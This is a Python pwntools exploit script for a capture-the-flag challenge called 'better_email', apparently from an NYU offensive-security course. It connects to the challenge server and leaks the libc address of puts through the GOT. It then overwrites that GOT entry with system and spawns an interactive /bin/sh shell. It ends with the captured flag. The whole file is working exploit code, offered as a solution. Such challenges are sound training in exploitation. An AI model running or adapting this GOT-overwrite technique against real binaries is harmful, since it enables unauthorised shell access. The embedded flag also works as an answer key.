from pwn import *

# context.log_level = 'debug'
# context.terminal = ['tmux', 'splitw', '-h', '-f']

CHALLENGE = "./better_email"
URL = "offsec-chalbroker.osiris.cyber.nyu.edu"
PORT = 1296
NETID = b"xz4344"
LOCAL = False

if LOCAL:
    p = process(CHALLENGE)
else:
    p = remote(URL, PORT)
    p.recvuntil(b"NetID (something like abc123): ")
    p.sendline(NETID)

# p = gdb.debug(CHALLENGE, '''
#     b main
#     continue
# ''')

e = ELF(CHALLENGE)
got_puts_addr = e.got.puts

print(p.recvuntil(b": ").decode())
p.send(p64(got_puts_addr))
log.info(f"Sending GOT puts address: {hex(got_puts_addr)}")
libc_puts_addr = u64(p.recv(8))
log.info(f"Receiving leaked puts address: {hex(libc_puts_addr)}")

libc = ELF("libc.so.6")
libc_base_addr = libc_puts_addr - libc.symbols.puts
libc_system_addr = libc_base_addr + libc.symbols.system

print(p.recvuntil(b": ").decode())
p.send(p64(libc_system_addr) + p64(got_puts_addr))
log.info(f"Sending calculated system address along with GOT puts address: {hex(libc_system_addr)} {hex(got_puts_addr)}")

print(p.recvuntil(b": ").decode())
p.send(b"/bin/sh\x00")
log.info("Sending command: /bin/sh")

p.interactive()

# flag{gl1bC_l34k_plus_G0T_0v3rwr1t3!!_7c650cd504a8ed65}
